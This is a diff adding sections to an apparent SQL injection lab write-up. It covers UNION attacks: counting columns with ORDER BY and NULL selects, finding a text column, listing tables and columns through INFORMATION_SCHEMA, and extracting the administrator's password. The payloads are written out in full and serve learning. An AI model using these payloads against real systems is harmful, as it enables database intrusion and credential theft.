@@ -81,3 +81,39 @@ Finally, after inserting `'UNION SELECT PASSWORD_ALNMIB, NULL FROM USERS_ELCPUF
 WHERE USERNAME_OTLSQB ='administrator'--` we can retrieve the administrator' password.
 
 ## 7. SQL injection UNION attack determining the number of columns returned by the query
+
+We can insert `'UNION SELECT NULL, NULL, NULL--` or `'ORDER BY 3--` to find the columns returned. Increase the number of `NULL` select columns or the number of columns, respectively in the ordering. 
+
+With `'UNION SELECT NULL, NULL, NULL--` returns an error if the number of select columns is not correct.
+
+Using `'ORDER BY 3'` returns an error if the number of columns in the previous query is exceeded.
+
+## 8. SQL injection UNION attack, finding a column containing text
+
+Insert `'ORDER BY 3--` to determine the columns returned.
+
+Try inserting one by one to identify the text return column:
+
+`'UNION SELECT 'a', NULL, NULL--`
+
+`'UNION SELECT NULL, 'a', NULL--`
+
+`'UNION SELECT NULL, NULL, 'a'--`
+
+`...`
+
+## 9. SQL injection UNION attack, retrieving data from other tables
+
+Insert `'ORDER BY 2--` to determine the comlumns returned.
+
+Insert `'UNION SELECT TABLE_NAME, NULL FROM 
+INFORMATION_SCHEMA.TABLES--` to determine table names that contain users' information.
+
+Insert `'UNION SELECT COLUMN_NAME, NULL FROM 
+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'--` to determine the columns that contain username and user password.
+
+Last, insert `'UNION SELECT password FROM users WHERE username = 
+'administrator'--` to retrieve the administrator's information.
+
+
+
